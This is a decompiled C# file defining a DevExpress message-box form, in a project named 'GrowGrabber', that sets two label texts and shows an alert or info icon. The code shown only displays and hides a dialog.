using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using DevExpress.XtraEditors;
using GrowGrabber.Properties;

namespace GrowGrabber
{
	// Token: 0x0200000A RID: 10
	public partial class msgbox : XtraForm
	{
		// Token: 0x06000054 RID: 84 RVA: 0x00007D20 File Offset: 0x00005F20
		public msgbox()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00007D4F File Offset: 0x00005F4F
		private void simpleButton1_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00007D58 File Offset: 0x00005F58
		private void ss(string type, Resources lol)
		{
			if (this.icol == "alert")
			{
				this.pictureBox1.Image = Resources.shell32_16710;
			}
			if (this.icol == "info")
			{
				this.pictureBox1.Image = Resources.windows10_info_icon;
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00007DAC File Offset: 0x00005FAC
		private void msgbox_Load(object sender, EventArgs e)
		{
			this.label2.Text = this.str2;
			this.label1.Text = this.str1;
			if (this.icol == "alert")
			{
				this.pictureBox1.Image = Resources.shell32_16710;
			}
			if (this.icol == "info")
			{
				this.pictureBox1.Image = Resources.windows10_info_icon;
			}
		}

		// Token: 0x0400006D RID: 109
		public string str1 = "";

		// Token: 0x0400006E RID: 110
		public string str2 = "";

		// Token: 0x0400006F RID: 111
		public string icol = "";
	}
}
